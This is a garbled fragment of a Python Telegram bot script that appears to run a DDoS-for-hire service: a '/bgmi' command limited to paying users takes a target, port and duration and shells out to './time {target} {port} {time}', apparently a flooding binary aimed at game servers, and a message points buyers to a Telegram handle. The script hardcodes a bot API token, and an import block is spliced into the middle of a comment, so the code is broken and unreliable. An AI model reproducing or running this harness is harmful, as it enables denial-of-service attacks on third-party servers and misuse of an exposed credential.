...
bot = telebot.TeleBot('7851374071:AAELsbUailpXoSaJSorZLM-KcNuReWrURXY')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            # Check if the user has run the command before and isimport telebot
import subprocess
import requests
import datetime
import os
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 381:
                ...
                full_command = f"./time {target} {port} {time}"
        ...
        response = "JISAI ACCESS CHAHIYE YHA MSG KRO :- @FlashGaming_YT "
